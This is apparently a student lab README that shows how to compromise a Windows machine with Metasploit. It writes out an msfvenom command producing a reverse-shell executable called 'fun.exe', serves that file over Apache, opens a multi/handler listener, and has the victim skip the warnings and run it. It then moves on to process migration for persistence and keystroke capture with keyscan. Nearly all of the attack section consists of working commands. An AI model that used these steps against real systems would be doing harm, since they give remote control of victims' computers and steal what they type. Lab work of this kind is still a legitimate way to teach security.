# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:
Step 1: Install kali linux either in partition or virtual box or in live mode
Step 2: Investigate on the various categories of tools as follows:
Step 3: Open terminal and try execute some kali linux commands

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/0dd3d067-aba5-458c-9ae0-dc8287c7228e)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/d3ccdc73-0cf7-4c28-859f-30d6912bc614)


copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/1753dc20-b629-41be-8f4f-3059ea1ccac3)


Start apache server sudo systemctl apache2 start

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/8b15cfae-eeea-45e9-8dd5-9949e1775d08)

Check the status of apache2
Invoke msfconsole: msfconsole



![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/2b781436-eea0-4609-bd43-c0a1fbd92834)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/ad4589ab-c275-4f10-a667-d3e393339177)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/cc3b7ab2-dd6b-476c-a98b-bb2727669621)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/9a147d92-87a4-46c7-8ee7-a5df75e47463)


Bypass any warning boxes, double-click the file, and allow it to run.


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/38950493-c57d-4afb-835b-cdc946e9b0f6)

On kali give the command exploit

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/22217eab-0577-4df0-b438-fb73c13b1ca1)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156


![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/74d5af80-b9d5-4175-ab54-6014339dcb8a)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/15d5a3da-048d-4646-a9a6-b3804542ff37)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/4d1ae16f-5053-4ab4-898e-e38e606f2b91)


keyscan_dump Shows the keystrokes captured so far.

![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/95831af7-2bb6-43da-943e-360a3bdca497)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
